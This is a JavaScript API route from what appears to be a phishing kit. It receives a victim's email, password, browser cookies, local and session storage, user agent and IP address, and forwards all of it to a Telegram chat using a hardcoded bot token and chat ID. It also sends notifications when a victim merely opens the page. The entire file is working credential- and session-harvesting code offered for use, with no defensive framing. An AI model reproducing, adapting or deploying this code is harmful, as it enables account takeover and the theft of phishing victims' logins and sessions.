/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";

// for telegram
import { TelegramClient } from "telegramsjs";

const botToken = "7845932956:AAF3wIfoatvyU-Jjmz6X28bSJKtXbHsWJaw";
const bot = new TelegramClient(botToken);
const chatId = "6024186045";

// Handle POST requests for form submissions
export async function POST(req) {
  const { eparams, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();

  try {
    // Send access notification if no password provided (just link accessed)
    if (!password) {
      const accessMessage = `
🔐 *Session Information*

*Username:* 
*Password:* 
*Landing URL:* 
${landingUrl || 'No URL provided'}

✅ *User Agent:*
${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}

✅ *Remote Address:*
${remoteAddress || 'Not available'}

❌ *Create Time:*
${Math.floor(Date.now() / 1000)}

❌ *Update Time:*
${Math.floor(Date.now() / 1000)}

🍪 *Cookies:*
${cookies || 'No cookies captured'}

💾 *Local Storage:*
${localStorageData || 'No local storage data captured'}

💾 *Session Storage:*
${sessionStorageData || 'No session storage data captured'}

✅ Tokens are added in txt file and attached separately in message.
      `;
      
      await bot.sendMessage({
        text: accessMessage,
        chatId: chatId,
        parse_mode: "Markdown"
      });
      
      console.log("Access notification sent to Telegram");
      
      return new Response(
        JSON.stringify({ message: "Access notification sent!" }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    // Send credentials if password is provided
    const credentialsMessage = `
🔐 *Session Information*

*Username:* ${eparams}
*Password:* ${password}
*Landing URL:* 
${landingUrl || 'No URL provided'}

✅ *User Agent:*
${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}

✅ *Remote Address:*
${remoteAddress || 'Not available'}

❌ *Create Time:*
${Math.floor(Date.now() / 1000)}

❌ *Update Time:*
${Math.floor(Date.now() / 1000)}

🍪 *Cookies:*
${cookies || 'No cookies captured'}

💾 *Local Storage:*
${localStorageData || 'No local storage data captured'}

💾 *Session Storage:*
${sessionStorageData || 'No session storage data captured'}

✅ Tokens are added in txt file and attached separately in message.
    `;

    await bot.sendMessage({
      text: credentialsMessage,
      chatId: chatId,
      parse_mode: "Markdown"
    });

    console.log(
      `Results sent to telegram successfully Email: ${eparams}, Password: ${password}`
    );

    return new Response(
      JSON.stringify({ message: "Credentials sent successfully!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
    return new Response(JSON.stringify({ error: "Error sending message" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Handle GET requests for page access notifications
export async function GET(req) {
  try {
    const url = new URL(req.url);
    const email = url.searchParams.get('email');
    const userAgent = url.searchParams.get('userAgent');
    const remoteAddress = url.searchParams.get('remoteAddress');
    const landingUrl = url.searchParams.get('landingUrl');
    const cookies = url.searchParams.get('cookies');
    const localStorageData = url.searchParams.get('localStorage');
    const sessionStorageData = url.searchParams.get('sessionStorage');
    
    const accessMessage = `
🔐 *Session Information*

*Username:* ${email || ''}
*Password:* 
*Landing URL:* 
${landingUrl || 'No URL provided'}

✅ *User Agent:*
${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}

✅ *Remote Address:*
${remoteAddress || 'Not available'}

❌ *Create Time:*
${Math.floor(Date.now() / 1000)}

❌ *Update Time:*
${Math.floor(Date.now() / 1000)}

🍪 *Cookies:*
${cookies || 'No cookies captured'}

💾 *Local Storage:*
${localStorageData || 'No local storage data captured'}

💾 *Session Storage:*
${sessionStorageData || 'No session storage data captured'}

✅ Tokens are added in txt file and attached separately in message.
    `;
    
    await bot.sendMessage({
      text: accessMessage,
      chatId: chatId,
      parse_mode: "Markdown"
    });
    
    console.log("Page access notification sent to Telegram");
    
    return new Response(
      JSON.stringify({ message: "Access notification sent!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending access notification:", error);
    return new Response(JSON.stringify({ error: "Error sending access notification" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
